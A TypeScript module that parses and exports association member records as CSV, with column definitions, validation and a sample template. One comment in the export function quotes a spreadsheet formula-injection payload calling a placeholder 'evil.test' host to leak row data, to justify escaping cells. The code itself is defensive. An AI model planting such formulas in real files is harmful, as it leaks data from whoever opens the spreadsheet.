import Papa from "papaparse";

import { memberInputSchema, type MemberInput } from "@/lib/validation/member";
import { escapeCsvCell } from "@/lib/validation/text-safety";

/**
 * Canonical import/export column order. The import template and the
 * exporter both derive from this list so they can never drift apart.
 */
export const CSV_HEADERS = [
  "first_name",
  "last_name",
  "email",
  "phone",
  "legacy_id",
  "profession",
  "business_name",
  "address_line1",
  "address_line2",
  "area",
  "city",
  "state",
  "pincode",
  "dob",
  "blood_group",
  "status",
  "fees_paid_upto",
  "death_fund_covered",
  "notes",
] as const;

export type CsvHeader = (typeof CSV_HEADERS)[number];

/**
 * Every column the export can emit, with the label the field-picker shows.
 *
 * `key` is the machine header written into the file — it stays identical to the
 * import columns so an export round-trips back through the importer, and the
 * existing round-trip test keeps passing. `label` is display-only.
 *
 * The generated `member_id` (`MDPVA-YYYY-NNNN`) is deliberately not offered
 * here: it exists for internal/system reference only. `legacy_id` — the
 * ledger number staff and members actually recognise — is the sole
 * "membership number" column, and leads the list.
 *
 * The order here is the canonical file order and MUST contain exactly the
 * same keys as `CSV_HEADERS` (with `legacy_id` moved to the front) — a unit
 * test asserts it, so adding a CSV column without a matching label fails CI
 * rather than silently dropping out of the picker.
 */
export const EXPORT_FIELDS = [
  { key: "legacy_id", label: "Membership No. (ledger)" },
  { key: "first_name", label: "First name" },
  { key: "last_name", label: "Last name" },
  { key: "email", label: "Email" },
  { key: "phone", label: "Phone" },
  { key: "profession", label: "Profession" },
  { key: "business_name", label: "Business name" },
  { key: "address_line1", label: "Address line 1" },
  { key: "address_line2", label: "Address line 2" },
  { key: "area", label: "Area" },
  { key: "city", label: "City" },
  { key: "state", label: "State" },
  { key: "pincode", label: "Pincode" },
  { key: "dob", label: "Date of birth" },
  { key: "blood_group", label: "Blood group" },
  { key: "status", label: "Status" },
  { key: "fees_paid_upto", label: "Fees paid upto" },
  { key: "death_fund_covered", label: "Death fund covered" },
  { key: "notes", label: "Notes" },
] as const;

export type ExportFieldKey = (typeof EXPORT_FIELDS)[number]["key"];

/** The full column set, in canonical order — the default when none is chosen. */
export const ALL_EXPORT_FIELDS: ExportFieldKey[] = EXPORT_FIELDS.map((f) => f.key);

/**
 * Columns the importer hard-requires (`parseMembersCsv` missingHeaders list).
 * Dropping any of these produces a file that cannot be re-imported, so the
 * dialog warns when the selection omits one — it does not block, since a
 * report-shaped export (phone list, roster) is a legitimate use.
 */
export const IMPORT_REQUIRED_FIELDS: ExportFieldKey[] = [
  "first_name",
  "last_name",
  "address_line1",
  "city",
  "state",
];

export interface CsvRowError {
  /** 1-based data row number (header excluded). */
  row: number;
  field: string;
  message: string;
}

export interface ParsedCsvRow {
  row: number;
  input: MemberInput;
}

export interface ParseResult {
  rows: ParsedCsvRow[];
  errors: CsvRowError[];
  /** Headers present in the file that the template doesn't define. */
  unknownHeaders: string[];
  missingHeaders: string[];
}

const TRUTHY = new Set(["true", "yes", "y", "1"]);
const FALSY = new Set(["false", "no", "n", "0", ""]);

function normalizeHeader(header: string): string {
  return header.trim().toLowerCase().replace(/[\s-]+/g, "_");
}

/**
 * Coerce one raw CSV record (all strings) into the shape
 * `memberInputSchema` expects, then validate it. Booleans accept
 * yes/no/true/false/1/0; profession/status accept the display labels the
 * app itself shows ("Photo & Video") as well as the enum values.
 */
export function coerceRow(
  record: Record<string, string>,
): ReturnType<typeof memberInputSchema.safeParse> {
  const get = (key: CsvHeader) => record[key]?.trim() ?? "";

  const professionRaw = get("profession").toLowerCase();
  const profession =
    professionRaw === "" ? null
    : professionRaw === "photo & video" || professionRaw === "photo and video" ? "photo_and_video"
    : professionRaw;

  const statusRaw = get("status").toLowerCase();
  const feesRaw = get("fees_paid_upto");
  const deathRaw = get("death_fund_covered").toLowerCase();

  return memberInputSchema.safeParse({
    firstName: get("first_name"),
    lastName: get("last_name"),
    email: get("email"),
    phone: get("phone"),
    legacyId: get("legacy_id"),
    profession,
    businessName: get("business_name"),
    addressLine1: get("address_line1"),
    addressLine2: get("address_line2"),
    area: get("area"),
    city: get("city"),
    state: get("state"),
    pincode: get("pincode"),
    dob: get("dob"),
    bloodGroup: get("blood_group"),
    notes: get("notes"),
    status: statusRaw === "" ? "active" : statusRaw,
    feesPaidUpto:
      feesRaw === "" ? null
      : /^\d{4}$/.test(feesRaw) ? Number(feesRaw)
      : Number.NaN,
    deathFundCovered: TRUTHY.has(deathRaw)
      ? true
      : FALSY.has(deathRaw)
        ? false
        : "invalid",
  });
}

export function parseMembersCsv(text: string): ParseResult {
  const parsed = Papa.parse<Record<string, string>>(text, {
    header: true,
    skipEmptyLines: "greedy",
    transformHeader: normalizeHeader,
  });

  const fileHeaders = (parsed.meta.fields ?? []).filter((h) => h !== "");
  const known = new Set<string>(CSV_HEADERS);
  const unknownHeaders = fileHeaders.filter((h) => !known.has(h));
  const missingHeaders = ["first_name", "last_name", "address_line1", "city", "state"].filter(
    (h) => !fileHeaders.includes(h),
  );

  const rows: ParsedCsvRow[] = [];
  const errors: CsvRowError[] = [];

  parsed.data.forEach((record, i) => {
    const rowNumber = i + 1;
    const result = coerceRow(record);
    if (result.success) {
      rows.push({ row: rowNumber, input: result.data });
    } else {
      for (const issue of result.error.issues) {
        errors.push({
          row: rowNumber,
          field: String(issue.path[0] ?? ""),
          message: issue.message,
        });
      }
    }
  });

  return { rows, errors, unknownHeaders, missingHeaders };
}

export interface ExportableMember {
  legacyId: string | null;
  firstName: string;
  lastName: string | null;
  email: string | null;
  phone: string | null;
  profession:
    | "photographer"
    | "videographer"
    | "photo_and_video"
    | "drone_operator"
    | null;
  businessName: string | null;
  addressLine1: string | null;
  addressLine2: string | null;
  area: string | null;
  city: string | null;
  state: string | null;
  pincode: string | null;
  dob: string | null;
  bloodGroup: string | null;
  status: string;
  feesPaidUpto: number | null;
  deathFundCovered: boolean;
  notes: string | null;
}

/**
 * Serialise members to CSV. `columns` selects which fields appear, in canonical
 * order; it defaults to the full set so existing callers and the import
 * round-trip are unaffected. Every row is still built in full — `Papa.unparse`
 * emits only the requested `columns`, so a field the caller dropped never
 * reaches the file.
 */
export function membersToCsv(
  members: ExportableMember[],
  columns: readonly ExportFieldKey[] = ALL_EXPORT_FIELDS,
): string {
  const data = members.map((m) => ({
    first_name: m.firstName,
    last_name: m.lastName,
    email: m.email ?? "",
    phone: m.phone ?? "",
    legacy_id: m.legacyId ?? "",
    profession: m.profession ?? "",
    business_name: m.businessName ?? "",
    address_line1: m.addressLine1 ?? "",
    address_line2: m.addressLine2 ?? "",
    area: m.area ?? "",
    city: m.city ?? "",
    state: m.state ?? "",
    pincode: m.pincode ?? "",
    dob: m.dob ?? "",
    blood_group: m.bloodGroup ?? "",
    status: m.status,
    fees_paid_upto: m.feesPaidUpto ?? "",
    death_fund_covered: m.deathFundCovered ? "yes" : "no",
    notes: m.notes ?? "",
  }));

  // `Papa.unparse` quotes and escapes for CSV *parsing*, but does nothing about
  // spreadsheet formula execution: a member named `=HYPERLINK("http://evil
  // .test?"&A1,"Click")` fires the moment an admin opens the export in Excel,
  // leaking the row it sits in. Escaping happens here, on the way out, so
  // stored values round-trip unchanged.
  const safe = data.map((row) =>
    Object.fromEntries(
      Object.entries(row).map(([key, value]) => [
        key,
        typeof value === "string" ? escapeCsvCell(value) : value,
      ]),
    ),
  );

  return Papa.unparse(safe, {
    columns: [...columns],
    newline: "\n",
  });
}

/** Header row + one illustrative example row, for the downloadable template. */
export function templateCsv(): string {
  const example: Record<CsvHeader, string> = {
    first_name: "Ramesh",
    last_name: "Kumar",
    email: "ramesh@example.com",
    // Not 9876543210: the importer rejects sequential runs as placeholder junk,
    // so an example row using one would fail the moment staff filled it in.
    phone: "9845011234",
    legacy_id: "MDPVA/OLD/123",
    profession: "photographer",
    business_name: "Ramesh Studio",
    address_line1: "12, MG Road",
    address_line2: "",
    area: "Lakshmipuram",
    city: "Mysuru",
    state: "Karnataka",
    pincode: "570004",
    dob: "1975-06-15",
    blood_group: "B+",
    status: "active",
    fees_paid_upto: "2026",
    death_fund_covered: "yes",
    notes: "",
  };
  return Papa.unparse([example], { columns: [...CSV_HEADERS], newline: "\n" });
}
